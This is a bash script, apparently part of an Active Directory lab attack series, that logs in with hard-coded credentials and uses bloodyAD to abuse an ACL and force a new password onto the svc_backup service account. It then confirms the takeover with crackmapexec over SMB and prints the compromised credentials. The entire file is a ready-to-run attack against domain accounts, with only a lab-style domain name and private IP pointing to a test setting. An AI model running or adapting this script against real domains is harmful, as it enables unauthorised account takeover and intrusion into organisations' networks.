#!/usr/bin/env bash
set -euo pipefail

DC_IP="${DC_IP:-172.30.0.10}"
DOMAIN="${DOMAIN:-lab.local}"
USER="joao.silva"
PASS="Senha@123"
TARGET="svc_backup"
NEW_PASS="Pwned@2024!"
OUT="/opt/attacks/output"
mkdir -p "$OUT"

bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASS" \
    set password "$TARGET" "$NEW_PASS" 2>&1 | tee "$OUT/04-acl-abuse.log"

if crackmapexec smb "$DC_IP" -d "$DOMAIN" -u "$TARGET" -p "$NEW_PASS" 2>&1 \
    | tee "$OUT/04-acl-validate.log" | grep -q '\[+\]'; then
    echo "[+] Compromisso confirmado: ${DOMAIN}\\${TARGET}:${NEW_PASS}"
else
    echo '[!] Validação da senha resetada falhou'
    exit 1
fi
